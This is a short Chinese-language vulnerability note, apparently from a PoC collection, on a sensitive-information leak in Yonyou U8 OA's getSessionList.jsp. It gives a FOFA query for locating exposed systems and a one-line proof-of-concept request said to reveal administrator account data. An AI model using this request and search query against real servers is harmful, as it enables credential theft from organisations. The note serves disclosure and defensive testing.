# 用友 U8 OA getSessionList.jsp 敏感信息泄漏漏洞

## 漏洞描述

用友 U8 OA getSessionList.jsp文件，通过漏洞攻击者可以获取数据库中管理员的账户信息

## 漏洞影响

```
用友 U8 OA
```

## FOFA

```
"用友U8-OA"
```

## 漏洞复现

登录页面

![image-20220520141805589](./images/202205201418731.png)

验证POC

```
/yyoa/ext/https/getSessionList.jsp?cmd=getAll
```

![image-20220520141832426](./images/202205201418464.png)